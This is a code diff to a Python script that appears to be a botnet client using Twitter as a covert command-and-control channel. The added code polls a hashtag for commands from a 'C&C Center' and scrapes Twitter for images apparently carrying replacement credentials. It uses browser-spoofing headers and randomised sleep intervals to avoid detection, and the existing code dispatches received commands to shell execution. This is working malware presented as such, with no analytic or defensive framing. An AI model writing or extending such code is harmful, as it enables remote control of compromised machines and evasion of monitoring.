@@ -10,6 +10,9 @@ import urllib
 import re
 import ctypes
 import base64
+import time
+import random
+import requests
 import subprocess
 from subprocess import check_output
 
@@ -97,6 +100,21 @@ def meow_operation(operation_mode, operation_payload, sender):
     elif (operation_mode == "BASH_COMMAND"):
         run_bash_command(operation_payload, sender)
 
+def get_cmds():
+    print("Searching for hashtag: " + conf['id'])
+    # Get the last command from C&C Center
+    tweets = search_hashtag("#" + conf['id'])
+
+    print("Retrieving new commands...")
+    #print("Tweets: \n")
+    #for tweet in tweets:
+    #    print("     " + str(tweet) + "\n")
+    if(len(tweets) > 0):
+        return tweets
+    else:
+        print("Nothing new.")
+        return []
+
 def get_last_cmd():
     print("Searching for hashtag: " + conf['id'])
     # Get the last command from C&C Center
@@ -130,17 +148,45 @@ def process_tweet(tweet):
 def extract_urls():
     return re.search("(?P<url>https?://[^\s]+)", myString).group("url")
 
+def get_new_creds():
+    # Find an image that includes the new credentials
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+        'Referer': 'https://twitter.com/',
+        'Accept-Encoding': 'gzip,deflate',
+        'Host': 'twitter.com',
+        'Connection': 'Keep-Alive'
+    }
+
+    url = "https://twitter.com/search?q=%230fb8539d64f0899d2b0552fd2dde5328f5494d3a1bbad3dbcdbeafbb73c1fae4"
+
+    response = requests.get(url, headers=headers)
+    content = response.text.encode('utf-8').strip()
+
+    pattern = re.compile(r'(https:\/\/pbs\.twimg\.com\/media\/[\w]*\.png)')
+
+    for (image_url) in re.findall(pattern, content):
+        print image_url
+
 def main(argv):
     # Main 
-    
-    # Verify API Credentials
-    verify_api()
+    last_api_cred_check = 0
 
-    # Get last C&C tweet
-    cmd_tweet = get_last_cmd()
+    # Main Loop
+    while True:
+        # Verify API Credentials
+        if((time.time() - last_api_cred_check) > conf["api_cred_ttl"]):
+            verify_api()
 
-    if(cmd_tweet):
-        process_tweet(cmd_tweet)
+        # Get last C&C tweet
+        cmd_tweet = get_last_cmd()
+
+        if(cmd_tweet):
+            #process_tweet(cmd_tweet)
+            print "processing cmd..."
+
+        time.sleep(random.randint(conf["min_idle_secs"], conf["max_idle_secs"]))
+
 
 if __name__ == "__main__":
     main(sys.argv)
